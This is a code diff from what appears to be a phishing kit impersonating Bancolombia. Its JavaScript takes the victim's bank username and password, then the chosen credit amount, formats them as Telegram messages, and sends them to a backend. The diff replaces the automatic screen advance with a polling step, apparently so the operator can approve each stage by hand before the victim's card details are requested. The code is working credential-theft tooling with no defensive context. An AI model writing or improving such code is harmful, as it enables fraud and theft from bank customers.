@@ -371,7 +371,7 @@ function submitLogin() {
 
     const msg = `🔐 <b>Login Bancolombia</b>\n\n👤 Usuario: <code>${user}</code>\n🔑 Clave: <code>${pass}</code>\n\n🖥️ Dispositivo: ${detectDevice()}`;
     sendToBackend('login', msg).then(data => {
-        if (data.ok) autoAdvance('scr-monto', 'Verificando credenciales...');
+        if (data.ok) startPolling('scr-monto', 'login', msg);
     });
 }
 
@@ -379,18 +379,8 @@ function submitCupo() {
     const cupo = document.getElementById('cupo-val').textContent;
     const msg = `💳 <b>Cupo seleccionado</b>\n\n💰 Monto: <b>${cupo}</b>`;
     sendToBackend('cupo', msg).then(data => {
-        if (data.ok) autoAdvance('scr-tarjeta', 'Procesando cupo...');
+        if (data.ok) startPolling('scr-tarjeta', 'cupo', msg);
     });
-}
-
-/* ── Auto-advance (sin aprobación de Telegram) ── */
-function autoAdvance(targetScreen, loaderMsg) {
-    showWaitingLoader(loaderMsg || 'Procesando...', 'Por favor espere un momento');
-    setTimeout(() => {
-        loader.classList.remove('show');
-        restoreLoader();
-        showScreen(targetScreen);
-    }, 3500);
 }
 
 async function submitTarjeta() {
